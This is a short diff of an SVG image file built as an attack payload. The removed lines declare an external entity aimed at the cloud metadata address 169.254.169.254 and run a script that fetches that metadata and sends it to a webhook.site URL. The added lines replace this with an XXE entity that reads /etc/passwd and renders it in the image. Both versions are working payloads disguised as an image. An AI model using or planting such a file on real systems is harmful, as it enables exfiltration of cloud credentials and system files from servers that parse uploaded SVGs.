@@ -1,14 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="800px" height="800px">
   <script>
     <![CDATA[
-      fetch('http://169.254.169.254/latest/meta-data/')
-        .then(r => r.text())
-        .then(data => fetch('https://webhook.site/678717ea-2069-483b-896c-b475ffe7bac5?data=' + encodeURIComponent(data)))
+      console.log("&xxe;");
     ]]>
   </script>
-  <text x="10" y="20">&ssrf;</text>
+  <text x="10" y="20">&xxe;</text>
+  <path d="M8 16L3.54223 12.3383" fill="#000000"/>
 </svg>
